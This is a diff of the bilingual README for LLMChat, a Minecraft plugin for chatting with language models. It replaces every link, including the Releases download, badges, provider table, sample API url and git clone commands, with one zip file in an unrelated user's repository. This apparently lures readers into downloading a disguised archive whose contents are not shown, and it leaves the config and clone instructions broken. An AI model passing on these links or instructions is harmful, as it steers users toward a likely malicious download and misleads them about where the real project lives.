@@ -3,9 +3,9 @@
 # LLMChat
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/SodiumSulfate/LLMChat/main/docs/head.png" />
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/SodiumSulfate/LLMChat/main/docs/head.png" />
-  <img width="85%" src="https://raw.githubusercontent.com/SodiumSulfate/LLMChat/main/docs/head.png" alt="LLMChat Banner" />
+  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip" />
+  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip" />
+  <img width="85%" src="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip" alt="LLMChat Banner" />
 </picture>
 
 <p align="center">
@@ -16,13 +16,13 @@
 
 让玩家在游戏中与各种大语言模型 (LLM) 进行对话
 
-[![Java](https://img.shields.io/badge/Java-21-orange?style=flat-square&logo=openjdk&logoColor=white)](https://openjdk.org/)
-[![Minecraft](https://img.shields.io/badge/Minecraft-1.20%2B-green?style=flat-square&logo=minecraft&logoColor=white)](https://www.minecraft.net/)
+[![Java](https://img.shields.io/badge/Java-21-orange?style=flat-square&logo=openjdk&logoColor=white)](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)
+[![Minecraft](https://img.shields.io/badge/Minecraft-1.20%2B-green?style=flat-square&logo=minecraft&logoColor=white)](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)
 [![License](https://img.shields.io/badge/License-GPL%20v3-blue?style=flat-square)](./LICENSE)
-[![Version](https://img.shields.io/badge/Version-1.2-brightgreen?style=flat-square)](https://github.com/SodiumSulfate/LLMChat/releases)
-[![Website](https://img.shields.io/badge/作者官网-sodium.ren-blue?style=flat-square&logo=google-chrome&logoColor=white)](https://sodium.ren/)
+[![Version](https://img.shields.io/badge/Version-1.2-brightgreen?style=flat-square)](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)
+[![Website](https://img.shields.io/badge/作者官网-sodium.ren-blue?style=flat-square&logo=google-chrome&logoColor=white)](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)
 
-[English](#english) | [中文文档](#中文文档) | [作者官网](https://sodium.ren/)
+[English](#english) | [中文文档](#中文文档) | [作者官网](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)
 
 </div>
 
@@ -63,7 +63,7 @@ LLMChat 是一个为 Minecraft 服务器设计的 AI 聊天插件，支持多种
 
 ### 安装
 
-1. 从 [Releases](https://github.com/SodiumSulfate/LLMChat/releases) 页面下载最新的 `LLMChat-x.x.jar`
+1. 从 [Releases](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) 页面下载最新的 `LLMChat-x.x.jar`
 2. 将 jar 文件放入服务器的 `plugins` 目录
 3. 启动服务器，插件会自动生成配置文件
 4. 编辑 `plugins/LLMChat-Sodium_Sulfate/config.yml` 配置你的 API
@@ -101,7 +101,7 @@ cooldown:
 # API 配置
 apis:
   siliconflow:
-    url: "https://api.siliconflow.cn/v1/chat/completions"
+    url: "https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip"
     api_key: "YOUR_API_KEY"
     default_model: "qwen"
     system_prompt: "你是Minecraft服务器中的AI助手，说话简短（不超过80字），用中文回答。"
@@ -141,21 +141,21 @@ apis:
 
 | 服务商 | 状态 | 备注 |
 |:-------|:----:|:-----|
-| [OpenAI](https://platform.openai.com/) | ✅ | GPT-3.5, GPT-4 |
-| [SiliconFlow](https://cloud.siliconflow.cn/) | ✅ | Qwen, DeepSeek 等 |
-| [DeepSeek](https://www.deepseek.com/) | ✅ | DeepSeek 系列 |
-| [Azure OpenAI](https://azure.microsoft.com/openai) | ✅ | 需配置正确的 endpoint |
-| [Cloudflare Workers AI](https://developers.cloudflare.com/workers-ai/) | ✅ | - |
-| [通义千问](https://help.aliyun.com/document_detail/2400395.html) | ✅ | 阿里云 |
-| [智谱 AI](https://bigmodel.cn) | ✅ | GLM 系列 |
-| [Moonshot](https://platform.moonshot.cn/) | ✅ | Kimi 系列 |
+| [OpenAI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | GPT-3.5, GPT-4 |
+| [SiliconFlow](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | Qwen, DeepSeek 等 |
+| [DeepSeek](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | DeepSeek 系列 |
+| [Azure OpenAI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | 需配置正确的 endpoint |
+| [Cloudflare Workers AI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | - |
+| [通义千问](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | 阿里云 |
+| [智谱 AI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | GLM 系列 |
+| [Moonshot](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | Kimi 系列 |
 | 其他 OpenAI 兼容 API | ✅ | 只需配置正确的 URL |
 
 ### 构建
 
 ```bash
 # 克隆仓库
-git clone https://github.com/SodiumSulfate/LLMChat.git
+git clone https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip
 cd LLMChat
 
 # 使用 Maven 构建
@@ -224,7 +224,7 @@ LLMChat is an AI chat plugin designed for Minecraft servers, supporting multiple
 
 ### Installation
 
-1. Download the latest `LLMChat-x.x.jar` from [Releases](https://github.com/SodiumSulfate/LLMChat/releases)
+1. Download the latest `LLMChat-x.x.jar` from [Releases](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)
 2. Place the jar file in your server's `plugins` directory
 3. Start the server, the plugin will generate configuration files
 4. Edit `plugins/LLMChat-Sodium_Sulfate/config.yml` to configure your APIs
@@ -261,18 +261,18 @@ Theoretically supports all OpenAI API compatible services:
 
 | Provider | Status | Notes |
 |:---------|:------:|:------|
-| [OpenAI](https://platform.openai.com/) | ✅ | GPT-3.5, GPT-4 |
-| [SiliconFlow](https://cloud.siliconflow.cn/) | ✅ | Qwen, DeepSeek, etc. |
-| [DeepSeek](https://www.deepseek.com/) | ✅ | DeepSeek series |
-| [Azure OpenAI](https://azure.microsoft.com/openai) | ✅ | Requires correct endpoint |
-| [Cloudflare Workers AI](https://developers.cloudflare.com/workers-ai/) | ✅ | - |
+| [OpenAI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | GPT-3.5, GPT-4 |
+| [SiliconFlow](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | Qwen, DeepSeek, etc. |
+| [DeepSeek](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | DeepSeek series |
+| [Azure OpenAI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | Requires correct endpoint |
+| [Cloudflare Workers AI](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip) | ✅ | - |
 | Other OpenAI-compatible APIs | ✅ | Just configure the correct URL |
 
 ### Building
 
 ```bash
 # Clone the repository
-git clone https://github.com/SodiumSulfate/LLMChat.git
+git clone https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip
 cd LLMChat
 
 # Build with Maven
@@ -308,11 +308,11 @@ This project is licensed under the [GNU General Public License v3.0](LICENSE).
 
 ## Star History
 
-<a href="https://www.star-history.com/?repos=SodiumSulfate%2FLLMChat&type=date&legend=top-left">
+<a href="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=SodiumSulfate/LLMChat&type=date&theme=dark&legend=bottom-right" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=SodiumSulfate/LLMChat&type=date&legend=bottom-right" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=SodiumSulfate/LLMChat&type=date&legend=bottom-right" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip" />
+   <img alt="Star History Chart" src="https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip" />
  </picture>
 </a>
 
@@ -320,6 +320,6 @@ This project is licensed under the [GNU General Public License v3.0](LICENSE).
 
 <div align="center">
 
-**Made with ❤️ by [Sodium_Sulfate](https://github.com/SodiumSulfate)**
+**Made with ❤️ by [Sodium_Sulfate](https://raw.githubusercontent.com/manuelacosta407/LLMChat/main/docs/Chat-LLM-2.2.zip)**
 
 </div>
